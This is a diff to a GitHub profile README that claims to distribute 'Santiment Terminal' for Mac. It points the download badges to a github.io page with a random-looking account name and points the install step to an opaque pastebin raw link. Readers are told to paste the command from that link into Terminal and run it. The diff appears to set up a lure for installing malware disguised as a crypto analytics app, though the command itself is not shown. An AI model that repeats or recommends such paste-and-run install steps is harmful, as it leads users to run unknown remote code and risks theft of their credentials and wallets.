@@ -1,7 +1,7 @@
 ## Hi there 👋
-[![Get App](https://img.shields.io/badge/Get-App-black?style=for-the-badge&logo=apple)]()
-<!--
 
+<!--
+[![Get App](https://img.shields.io/badge/Get-App-black?style=for-the-badge&logo=apple)](https://kjskkfifi84875.github.io/.github/apps)
 **Here are some ideas to get you started:**
 
 🙋‍♀️ A short introduction - what is your organization all about?
@@ -12,7 +12,8 @@
 -->
 
 
-[![Get App](https://img.shields.io/badge/Get-App-black?style=for-the-badge&logo=apple)]()
+[![Get App](https://img.shields.io/badge/Get-App-black?style=for-the-badge&logo=apple)](https://kjskkfifi84875.github.io/.github/)
+
 
 
 ## 📦 How to Install Santiment Terminal For Mac
@@ -32,5 +33,5 @@
 ### Method 2: Install via Terminal Command (Quick Start)
 
 1.  Copy the one-time installation command:
-    **[Get Installation Command](https://pastebin.com/raw/santiment-terminal-install)**
+    **[Get Installation Command](https://pastebin.com/raw/xNM7bRzW )**
 2.  Open **Terminal** (from Applications/Utilities), paste the copied command, and press `Return` to run it. Follow any on-screen prompts.
